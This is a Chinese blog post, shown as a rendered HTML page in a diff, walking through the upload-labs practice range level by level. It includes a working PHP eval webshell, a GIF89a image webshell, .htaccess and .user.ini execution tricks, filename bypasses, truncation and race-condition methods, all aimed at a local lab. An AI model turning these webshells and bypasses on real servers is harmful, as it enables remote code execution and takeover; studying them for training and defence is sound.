@@ -1,0 +1,1987 @@
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="description" content="这里是 @PurgationDevil 的个人博客，与你一起发现更大的世界">
+    <meta name="keywords" content="PurgationDevil Blog, 博客, 个人网站, 互联网, Web, 逆向, C语言数据结构">
+    <meta name="theme-color" content="#000000">
+
+    <!-- Open Graph -->
+    <meta property="og:title"
+        content="upload-lebs - PurgationDevil Blog">
+    
+    <meta property="og:type" content="article">
+    <meta property="og:description" content="upload-lebs
+
+推荐用phpstudy2016版搭建靶场，可以复原所有环境。
+工具：burpsuite（或Yakit）、中国蚁剑（或哥斯拉、冰蝎系列）
+
+Pass-1(JS限制)
+
+1
+&lt;?php @eval($_POST['pass']); ?&gt;
+
+
+关JavaScript，或删掉限制条件。
+
+Pass-2(MIME限制)
+
+MIME检查会在POSE请求之后进行，所以...">
+    
+    <meta property="article:published_time" content=" 2026-04-03T00:00:00Z">
+    
+    
+    
+    <meta property="article:tag" content="web">
+    
+    
+    <meta property="og:image" content="https://PurgationDevil.github.iohttps://github.com/PurgationDevil.png">
+    <meta property="og:url" content="https://PurgationDevil.github.io/%E5%88%86%E7%B1%BB%E5%90%8D%E7%A7%B0/2026/04/03/upload-labs/">
+    <meta property="og:site_name" content="PurgationDevil Blog">
+
+    <title>upload-lebs - PurgationDevil Blog</title>
+
+    <!-- Web App Manifest -->
+    <link rel="manifest" href="/pwa/manifest.json">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://PurgationDevil.github.io/%E5%88%86%E7%B1%BB%E5%90%8D%E7%A7%B0/2026/04/03/upload-labs/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href=" /css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href=" /css/hux-blog.min.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet"
+        type="text/css">
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Loading Animation -->
+    <style>
+    #loader-wrapper {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 99999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        transition: opacity 0.3s ease 0.5s;
+    }
+
+    #loader-wrapper::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(10, 15, 30, 0.9);
+        z-index: 0;
+        transition: opacity 0.3s ease;
+    }
+
+    #loader-wrapper.loaded::before {
+        opacity: 0;
+    }
+
+    #loader-wrapper.loaded {
+        pointer-events: none;
+    }
+
+    #loader-wrapper.loaded .loader-left,
+    #loader-wrapper.loaded .loader-right {
+        transform: translateX(0);
+        opacity: 0;
+    }
+
+    #loader-wrapper.loaded .loader-content {
+        opacity: 0;
+        transform: scale(0.8);
+    }
+
+    .loader-left,
+    .loader-right {
+        position: absolute;
+        top: 0;
+        width: 50%;
+        height: 100%;
+        transition: transform 0.8s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.5s ease;
+    }
+
+    .loader-left {
+        left: 0;
+        transform: translateX(0);
+        background: linear-gradient(135deg, rgba(255, 107, 157, 0.3) 0%, rgba(196, 69, 105, 0.2) 100%);
+    }
+
+    .loader-right {
+        right: 0;
+        transform: translateX(0);
+        background: linear-gradient(315deg, rgba(196, 69, 105, 0.2) 0%, rgba(255, 107, 157, 0.3) 100%);
+    }
+
+    #loader-wrapper.loaded .loader-left {
+        transform: translateX(-100%);
+    }
+
+    #loader-wrapper.loaded .loader-right {
+        transform: translateX(100%);
+    }
+
+    .loader-content {
+        position: relative;
+        z-index: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        transition: all 0.5s ease;
+    }
+
+    .loader {
+        position: relative;
+        width: 60px;
+        height: 60px;
+    }
+
+    .loader-circle {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        border-radius: 50%;
+        border: 2px solid transparent;
+        animation: spin 2s linear infinite;
+    }
+
+    .loader-circle:nth-child(1) {
+        border-top-color: rgba(255, 107, 157, 0.8);
+        animation-duration: 1.5s;
+    }
+
+    .loader-circle:nth-child(2) {
+        border-right-color: rgba(196, 69, 105, 0.8);
+        animation-duration: 1.8s;
+        animation-direction: reverse;
+    }
+
+    .loader-circle:nth-child(3) {
+        border-bottom-color: rgba(248, 181, 0, 0.8);
+        animation-duration: 2s;
+    }
+
+    .loader-center {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 15px;
+        height: 15px;
+        background: rgba(255, 107, 157, 0.9);
+        border-radius: 50%;
+        box-shadow: 0 0 15px rgba(255, 107, 157, 0.8), 0 0 30px rgba(255, 107, 157, 0.5);
+        animation: pulse 1s ease-in-out infinite;
+    }
+
+    .loader-text {
+        margin-top: 30px;
+        color: rgba(255, 107, 157, 0.9);
+        font-size: 12px;
+        font-family: 'Montserrat', sans-serif;
+        letter-spacing: 3px;
+        animation: fadeInOut 2s ease-in-out infinite;
+    }
+
+    .loader-progress {
+        margin-top: 20px;
+        width: 120px;
+        height: 3px;
+        background: rgba(255, 255, 255, 0.2);
+        border-radius: 2px;
+        overflow: hidden;
+    }
+
+    .loader-progress-bar {
+        height: 100%;
+        background: linear-gradient(90deg, #ff6b9d, #c44569);
+        border-radius: 2px;
+        animation: progress 2s ease-in-out infinite;
+        width: 0;
+    }
+
+    .loader-percent {
+        margin-top: 10px;
+        color: rgba(255, 107, 157, 0.7);
+        font-size: 10px;
+        font-family: 'Montserrat', sans-serif;
+        letter-spacing: 1px;
+    }
+
+    @keyframes spin {
+        from { transform: rotate(0deg); }
+        to { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse {
+        0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+        50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.7; }
+    }
+
+    @keyframes fadeInOut {
+        0%, 100% { opacity: 0.5; }
+        50% { opacity: 0.9; }
+    }
+
+    @keyframes progress {
+        0% { width: 0%; }
+        50% { width: 70%; }
+        100% { width: 100%; }
+    }
+
+    @keyframes fadeInUp {
+        from {
+            opacity: 0;
+            transform: translateY(30px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    .content-fade-in {
+        animation: fadeInUp 0.6s ease-out forwards;
+        opacity: 0;
+    }
+
+    .content-hidden {
+        opacity: 0;
+    }
+    </style>
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+
+    <!-- Google AdSense -->
+    <script data-ad-client="ca-pub-6487568398225121" async
+        src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+</head>
+
+
+<div id="loader-wrapper">
+    <div class="loader-left"></div>
+    <div class="loader-right"></div>
+    <div class="loader-content">
+        <div class="loader">
+            <div class="loader-circle"></div>
+            <div class="loader-circle"></div>
+            <div class="loader-circle"></div>
+            <div class="loader-center"></div>
+        </div>
+        <div class="loader-text">LOADING...</div>
+        <div class="loader-progress">
+            <div class="loader-progress-bar"></div>
+        </div>
+        <div class="loader-percent" id="loader-percent">0%</div>
+    </div>
+</div>
+
+<!-- Navigation -->
+
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="/">PurgationDevil Blog</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div id="huxblog_navbar">
+                <div class="navbar-collapse">
+                    <ul class="nav navbar-nav navbar-right">
+                        <li><a href="/">首页</a></li>
+                        <li><a href="/about">关于</a></li>
+                        <li><a href="/archive">归档</a></li>
+                        <li class="search-icon">
+                            <a href="javascript:void(0)">
+                                <i class="fa fa-search"></i>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <script>
+        // Drop Bootstarp low-performance Navbar
+        // Use customize navbar with high-quality material design animation
+        // in high-perf jank-free CSS3 implementation
+        var $body = document.body;
+        var $toggle = document.querySelector('.navbar-toggle');
+        var $navbar = document.querySelector('#huxblog_navbar');
+        var $collapse = document.querySelector('.navbar-collapse');
+
+        var __HuxNav__ = {
+            close: function () {
+                $navbar.className = " ";
+                // wait until animation end.
+                setTimeout(function () {
+                    // prevent frequently toggle
+                    if ($navbar.className.indexOf('in') < 0) {
+                        $collapse.style.height = "0px"
+                    }
+                }, 400)
+            },
+            open: function () {
+                $collapse.style.height = "auto"
+                $navbar.className += " in";
+            }
+        }
+
+        // Bind Event
+        $toggle.addEventListener('click', function (e) {
+            if ($navbar.className.indexOf('in') > 0) {
+                __HuxNav__.close()
+            } else {
+                __HuxNav__.open()
+            }
+        })
+
+        /**
+         * Since Fastclick is used to delegate 'touchstart' globally
+         * to hack 300ms delay in iOS by performing a fake 'click',
+         * Using 'e.stopPropagation' to stop 'touchstart' event from 
+         * $toggle/$collapse will break global delegation.
+         * 
+         * Instead, we use a 'e.target' filter to prevent handler
+         * added to document close HuxNav.  
+         *
+         * Also, we use 'click' instead of 'touchstart' as compromise
+         */
+        document.addEventListener('click', function (e) {
+            if (e.target == $toggle) return;
+            if (e.target.className == 'icon-bar') return;
+            __HuxNav__.close();
+        })
+    </script>
+
+<!-- Search -->
+<div class="search-page">
+  <div class="search-icon-close-container">
+    <span class="search-icon-close">
+      <i class="fa fa-chevron-down"></i>
+    </span>
+  </div>
+  <div class="search-main container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <form></form>
+        <input type="text" id="search-input" placeholder="$ grep...">
+        </form>
+        <div id="search-results" class="mini-post-list"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="main-content" class="content-hidden">
+    <!-- Mermaid 支持 -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: 'default'
+    });
+    mermaid.init(undefined, document.querySelectorAll('.language-mermaid'));
+  });
+</script>
+
+<!-- 固定目录（跟随滚动） - PC端 -->
+<style>
+.toc-fixed {
+  position: fixed;
+  right: 20px;
+  top: 40%;
+  transform: translateY(-50%);
+  width: 200px;
+  max-height: 60vh;
+  background: rgba(255, 255, 255, 0.95);
+  backdrop-filter: blur(10px);
+  border-radius: 12px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+  padding: 16px;
+  overflow-y: auto;
+  z-index: 999;
+  border: 1px solid #eaeaea;
+}
+
+.toc-fixed h4 {
+  margin: 0 0 12px 0;
+  font-size: 14px;
+  font-weight: 600;
+  color: #333;
+  padding-bottom: 8px;
+  border-bottom: 2px solid #0085a1;
+}
+
+.toc-fixed ul {
+  list-style: none;
+  padding-left: 0;
+  margin: 0;
+}
+
+.toc-fixed li {
+  margin: 8px 0;
+}
+
+.toc-fixed a {
+  color: #555;
+  text-decoration: none;
+  font-size: 13px;
+  display: block;
+  transition: all 0.2s;
+}
+
+.toc-fixed a:hover {
+  color: #0085a1;
+  transform: translateX(2px);
+}
+
+.toc-fixed a.active {
+  color: #0085a1;
+  font-weight: 500;
+  border-left: 2px solid #0085a1;
+  padding-left: 8px;
+}
+
+/* 滚动条 */
+.toc-fixed::-webkit-scrollbar {
+  width: 4px;
+}
+
+.toc-fixed::-webkit-scrollbar-track {
+  background: #f1f1f1;
+  border-radius: 4px;
+}
+
+.toc-fixed::-webkit-scrollbar-thumb {
+  background: #ccc;
+  border-radius: 4px;
+}
+
+/* 手机端隐藏PC目录 */
+@media (max-width: 992px) {
+  .toc-fixed {
+    display: none;
+  }
+}
+
+@media (prefers-color-scheme: dark) {
+  .toc-fixed {
+    background: rgba(10, 20, 30, 0.95);
+    border: 1px solid #2a3f5f;
+  }
+  
+  .toc-fixed h4 {
+    color: #ffffff;
+    border-bottom-color: #00d4ff;
+  }
+  
+  .toc-fixed a {
+    color: #d4d4d4;
+  }
+  
+  .toc-fixed a:hover {
+    color: #00d4ff;
+  }
+  
+  .toc-fixed a.active {
+    color: #00d4ff;
+    border-left-color: #00d4ff;
+  }
+  
+  .toc-fixed::-webkit-scrollbar-track {
+    background: #1a2735;
+  }
+  
+  .toc-fixed::-webkit-scrollbar-thumb {
+    background: #3a5065;
+  }
+}
+</style>
+
+<script>
+(function() {
+  function initToc() {
+    var article = document.querySelector('.post-container');
+    if (!article) return;
+    
+    var headers = article.querySelectorAll('h2, h3');
+    if (headers.length === 0) return;
+    
+    // 创建PC端目录
+    var tocDiv = document.createElement('div');
+    tocDiv.className = 'toc-fixed';
+    tocDiv.innerHTML = '<h4>📖 目录</h4><ul></ul>';
+    var tocList = tocDiv.querySelector('ul');
+    
+    headers.forEach(function(header, index) {
+      var id = 'toc-' + index;
+      header.id = id;
+      
+      // PC端目录项
+      var li = document.createElement('li');
+      var a = document.createElement('a');
+      a.href = '#' + id;
+      a.textContent = header.textContent;
+      a.addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+      });
+      li.appendChild(a);
+      tocList.appendChild(li);
+    });
+    
+    document.body.appendChild(tocDiv);
+    
+    // 高亮当前章节
+    var tocLinks = document.querySelectorAll('.toc-fixed a');
+    window.addEventListener('scroll', function() {
+      var scrollPos = window.scrollY + 100;
+      var currentId = null;
+      
+      headers.forEach(function(header) {
+        var offsetTop = header.offsetTop;
+        if (offsetTop <= scrollPos) {
+          currentId = header.id;
+        }
+      });
+      
+      tocLinks.forEach(function(link) {
+        link.classList.remove('active');
+        var href = link.getAttribute('href').substring(1);
+        if (href === currentId) {
+          link.classList.add('active');
+        }
+      });
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initToc);
+  } else {
+    initToc();
+  }
+})();
+</script>
+
+<!-- Image to hack wechat -->
+<!-- <img src="/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="/img/home-bg.jpg" width="0" height="0"> -->
+
+<!-- Post Header -->
+
+
+
+<style type="text/css">
+    header.intro-header{
+        position: relative;
+        background-image: url('/img/home-bg.jpg');
+        background: ;
+    }
+
+    
+</style>
+
+
+
+
+<header class="intro-header" >
+
+    <div class="header-mask"></div>
+    
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/archive/?tag=web" title="web">web</a>
+                        
+                    </div>
+                    <h1>upload-lebs</h1>
+                    
+                    <h2 class="subheading"></h2>
+                    <span class="meta">Posted by PurgationDevil Blog on April 3, 2026</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+
+
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <!-- Multi-Lingual -->
+                
+
+				<h1 id="upload-lebs">upload-lebs</h1>
+
+<p>推荐用phpstudy2016版搭建靶场，可以复原所有环境。
+工具：<em>burpsuite（或Yakit）</em>、<em>中国蚁剑（或哥斯拉、冰蝎系列）</em></p>
+
+<h2 id="pass-1js限制">Pass-1(JS限制)</h2>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>关JavaScript，或删掉限制条件。</p>
+
+<h2 id="pass-2mime限制">Pass-2(MIME限制)</h2>
+
+<p>MIME检查会在<strong>POSE请求之后</strong>进行，所以可以用burpsuite进行改包。</p>
+
+<p><em>注意：</em>把POST下方传入的文件的<strong>Content-Type</strong>改成imge/jpeg、image/png、image/gif这种典型的白名单。</p>
+
+<h2 id="pass-3其他文件名">Pass-3(其他文件名)</h2>
+
+<p>改后缀名.php3、.php5、phtml、pht、phar、pHp等</p>
+
+<h2 id="pass-4htaccess">Pass-4(.htaccess)</h2>
+
+<p>.htaccess管Apache的规则。（扔里整个文件夹就会被运行）</p>
+
+<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nc">AddType</span> application/x-httpd-php .txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>然后连接文件路径至文件名。（不要带.php）
+<em>.htaccess：监听80/443端口，把浏览器发来的HTTP请求传给对应的服务器，再把结果成HTTP的响应返回。</em></p>
+
+<h2 id="pass-5userini">Pass-5(.user.ini)</h2>
+
+<p>.user.ini管PHP的配置。（扔里整个文件夹就会被运行）</p>
+
+<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="py">auto_prepend_file</span><span class="p">=</span><span class="s">shell.jpg</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>然后连接文件路径至文件名。（不要带.php）
+<em>.user.ini：把.php文件里的HTML+PHP代码逐行执行，生成纯HTML（或JSON、图片等）。</em></p>
+
+<h2 id="pass-6大小写">Pass-6(大小写)</h2>
+
+<p>文件名改成 <code class="language-plaintext highlighter-rouge">shell.Php</code> 或 <code class="language-plaintext highlighter-rouge">shell.pHP</code> 或 <code class="language-plaintext highlighter-rouge">shell.Php5</code>或<code class="language-plaintext highlighter-rouge">.pHtml</code></p>
+
+<h2 id="pass-7加-">Pass-7(加<code class="language-plaintext highlighter-rouge"> </code>)</h2>
+
+<p>上传<code class="language-plaintext highlighter-rouge">.php </code>，连接<code class="language-plaintext highlighter-rouge">.php</code></p>
+
+<p><em>Linux 保存文件会保留空格。空格绕过主要针对 Windows 服务器。</em></p>
+
+<h2 id="pass-8加">Pass-8(加<code class="language-plaintext highlighter-rouge">.</code>)</h2>
+
+<p>上传<code class="language-plaintext highlighter-rouge">.php.</code>，连接<code class="language-plaintext highlighter-rouge">.php</code></p>
+
+<p><em>Linux 仍然不生效，保存文件会保留<code class="language-plaintext highlighter-rouge">.</code>。</em></p>
+
+<h2 id="pass-9加data">Pass-9(加<code class="language-plaintext highlighter-rouge">::$DATA</code>)</h2>
+
+<p>上传<code class="language-plaintext highlighter-rouge">.php::$DATA</code>，连接<code class="language-plaintext highlighter-rouge">.php</code></p>
+
+<p><em>Linux 和 macOS 不支持 <code class="language-plaintext highlighter-rouge">::$DATA</code> 语法，与PHP版本无关</em>
+<em>::$DATA：在 Windows 系统中，<code class="language-plaintext highlighter-rouge">::$DATA</code> 是 NTFS 文件系统中的一种<strong>数据流标识</strong>，用于访问文件的<strong>主要数据流</strong>。</em></p>
+
+<h2 id="pass-10加-">Pass-10(加<code class="language-plaintext highlighter-rouge">. .</code>)</h2>
+
+<p>上传<code class="language-plaintext highlighter-rouge">.php. .</code>，连接<code class="language-plaintext highlighter-rouge">.php</code></p>
+
+<p><em>Linux 仍然不生效。</em></p>
+
+<h2 id="pass-11双写">Pass-11(双写)</h2>
+
+<p>上传<code class="language-plaintext highlighter-rouge">.pphphp</code>，连接<code class="language-plaintext highlighter-rouge">.php</code></p>
+
+<h2 id="pass-12截断gat型">Pass-12(截断GAT型)</h2>
+
+<p>抓包，将文件名改成shell.png，将save_path的传参改成../upload/shell.php%00（GAT检查）</p>
+
+<h2 id="pass-13截断post型">Pass-13(截断POST型)</h2>
+
+<p>需要在Hex(16进制文件)中修改shell.php后的空格，否则空格无效。</p>
+
+<p>将文件名改成shell.png，将save_path的传参改成../upload/shell.php （POST检查）</p>
+
+<h2 id="pass-14pass-15pass-16文件头标识">Pass-14、Pass-15、Pass-16(文件头标识)</h2>
+
+<p>就是上传<strong>图片马</strong>，骗过 <code class="language-plaintext highlighter-rouge">getimagesize()</code> 等函数，再配合文件包含漏洞执行代码。</p>
+
+<p><strong>常见图片文件头</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">图片格式</th>
+      <th style="text-align: left">文件头（十六进制）</th>
+      <th style="text-align: left">文件头（ASCII/文本）</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">JPEG</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">FF D8 FF E0</code></td>
+      <td style="text-align: left">乱码，但开头是 <code class="language-plaintext highlighter-rouge">ÿØÿà</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">PNG</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">89 50 4E 47</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">.PNG</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">GIF</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">47 49 46 38</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">GIF8</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">BMP</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">42 4D</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">BM</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>用010 Editor修改文件头，或者最直接的就是在php代码前面加上<code class="language-plaintext highlighter-rouge">GIF89a</code>然后另起一行。</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>GIF89a
+<span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>上传后发现是<code class="language-plaintext highlighter-rouge">gif</code>以图片的形式上传的。访问这个图片。（后面的是文件包含的操作）</p>
+
+<p>图片马不会自己执行，需要被文件包含执行。</p>
+
+<pre><code class="language-txt">http://127.0.0.1/upload/include.php?file=upload/1120260319071146.gif
+</code></pre>
+
+<p>连接用这个路径就能get shell了。</p>
+
+<p><strong>核心原因</strong>：Web服务器根据<strong>后缀名</strong>决定如何解析文件</p>
+
+<ul>
+  <li><strong>自己找</strong>：扫描目录、分析代码</li>
+  <li><strong>自己造</strong>：上传 <code class="language-plaintext highlighter-rouge">.htaccess</code> 或 <code class="language-plaintext highlighter-rouge">.user.ini</code> 让服务器自动包含</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">对比</th>
+      <th style="text-align: left">第14关</th>
+      <th>第15关</th>
+      <th style="text-align: left">第16关</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">检测函数</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">getimagesize()</code></td>
+      <td><code class="language-plaintext highlighter-rouge">isImage()</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">exif_imagetype()</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">返回值</td>
+      <td style="text-align: left">数组或false</td>
+      <td>数组或false</td>
+      <td style="text-align: left">常量或false</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">绕过方式</td>
+      <td style="text-align: left">图片马</td>
+      <td>图片马</td>
+      <td style="text-align: left">图片马</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">后续利用</td>
+      <td style="text-align: left">需要文件包含</td>
+      <td>需要文件包含</td>
+      <td style="text-align: left">需要文件包含</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="pass-17二次渲染">Pass-17(二次渲染)</h2>
+
+<p>手工方法：</p>
+
+<ol>
+  <li>上传一个普通GIF</li>
+  <li>下载二次渲染后的GIF</li>
+  <li>对比原图和渲染图的<strong>差异</strong></li>
+  <li>找到<strong>没有被修改的区块</strong>（如图形数据区）</li>
+  <li>把PHP代码插在那里</li>
+  <li>上传修改后的GIF</li>
+</ol>
+
+<h2 id="pass-18条件竞争">Pass-18(条件竞争)</h2>
+
+<p><strong>条件竞争</strong>针对的是 <strong>「文件落地了，但还没被处理掉」</strong> 的那一瞬间。只要存在这个时间窗口，就有可能用并发挤进去执行代码。</p>
+
+<p><em>先上传保存，再检测删除</em>          <em>先上传保存，再重命名</em>          <em>先上传保存，再改内容</em>          <em>文件锁竞争</em>          <em>缓存/CDN 同步延迟</em>          <em>日志文件竞争</em>          <em><code class="language-plaintext highlighter-rouge">Session</code>文件竞争</em></p>
+
+<p>(Python代码问ai)
+<em>文件锁竞争：多线程同时上传同名文件时，可能一个线程在写，另一个线程在读，读到不完整的内容，但能触发代码执行。</em>
+<em>缓存/CDN 同步延迟：文件保存到本地后，同步到 CDN 或备份服务器之前，如果先被访问到，可能绕过一些检查。</em>
+<em>日志文件竞争：如果日志文件中能写入 PHP 代码，在日志被写入后、被清理前，如果能包含进来，也能形成竞争。（写日志时包含用户输入）</em>
+<em><code class="language-plaintext highlighter-rouge">Session</code>文件竞争：如果 Session 文件中能写入用户控制的代码，在 Session 写入后、被覆盖前，如果能包含进来，也能利用。</em></p>
+
+<h2 id="pass-19">Pass-19</h2>
+
+<p><strong>思路一：Apache解析漏洞 + 条件竞争</strong></p>
+
+<p><strong>原理</strong>：</p>
+
+<ul>
+  <li>Apache解析文件时，从最右边的后缀开始识别，遇到不认识的就往左移</li>
+  <li>如果上传 <code class="language-plaintext highlighter-rouge">shell.php.7z</code>，Apache先看 <code class="language-plaintext highlighter-rouge">.7z</code>（不认识）→ 再看 <code class="language-plaintext highlighter-rouge">.php</code>（认识，用PHP解析）</li>
+  <li>但问题是，服务器会用时间戳重命名文件，所以上传的 <code class="language-plaintext highlighter-rouge">shell.php.7z</code> 可能被改成 <code class="language-plaintext highlighter-rouge">12345.7z</code>，失去了 <code class="language-plaintext highlighter-rouge">.php</code> 后缀</li>
+</ul>
+
+<p><strong>关键点</strong>：代码是先移动文件，再重命名文件。在移动完成→重命名完成之间，存在一个<strong>时间窗口</strong>。如果在这个窗口期内访问到文件（此时文件名还是你上传的原始文件名），就能触发Apache解析漏洞。</p>
+
+<p><strong>操作步骤</strong>：</p>
+
+<p>1. 准备一个PHP木马文件，改名为 <code class="language-plaintext highlighter-rouge">shell.php.7z</code>（或其他白名单里且Apache不认识的扩展名，如 <code class="language-plaintext highlighter-rouge">.7z</code>）
+2. 用Python脚本干扰。
+3. 用Burp Intruder的Intruder不停访问 <code class="language-plaintext highlighter-rouge">/upload/shell.php.7z</code>
+4. 一旦在重命名前访问到，PHP代码被执行</p>
+
+<p><strong>思路二：图片马 + 文件包含</strong></p>
+
+<p><strong>原理</strong>：</p>
+
+<ul>
+  <li>虽然代码会检查扩展名（在白名单内才能上传），但<strong>不检查文件内容</strong></li>
+  <li>上传成功后，页面会回显图片路径</li>
+  <li>如果网站存在文件包含漏洞，可以用包含的方式执行图片马中的PHP代码</li>
+</ul>
+
+<p><strong>操作步骤</strong>：</p>
+
+<p>1. 制作图片马：在一张正常图片末尾追加PHP代码，或者直接构造GIF89a头的木马
+2. 上传这个图片马，保存为 <code class="language-plaintext highlighter-rouge">.jpg</code> 或 <code class="language-plaintext highlighter-rouge">.gif</code>（白名单允许）
+3. 获取上传后的图片路径（页面会显示）
+4. 如果存在文件包含点，通过文件包含访问该图片，执行其中的PHP代码</p>
+
+<p><strong>思路三：利用Windows重命名竞争 + 原文件残留</strong></p>
+
+<p>这个思路来自Windows环境下的一个特性。</p>
+
+<p><strong>原理</strong>：</p>
+
+<ul>
+  <li>代码使用 <code class="language-plaintext highlighter-rouge">time()</code> 生成新文件名，只精确到秒</li>
+  <li>如果在一秒内上传多个文件，重命名时会发生冲突，导致<strong>部分文件重命名失败</strong>，但原始文件依然保留在服务器上</li>
+  <li>这些保留的原始文件名（如 <code class="language-plaintext highlighter-rouge">shell.php.7z</code>）如果未被重命名，就能被直接访问</li>
+</ul>
+
+<p><strong>操作步骤</strong>：</p>
+
+<p>1. 用Burp Intruder高速并发上传同一文件（每秒几十上百次）
+2. 由于重命名冲突，部分文件未被重命名，保留了原始文件名
+3. 访问这些原始文件名的文件（需配合Apache解析漏洞）</p>
+
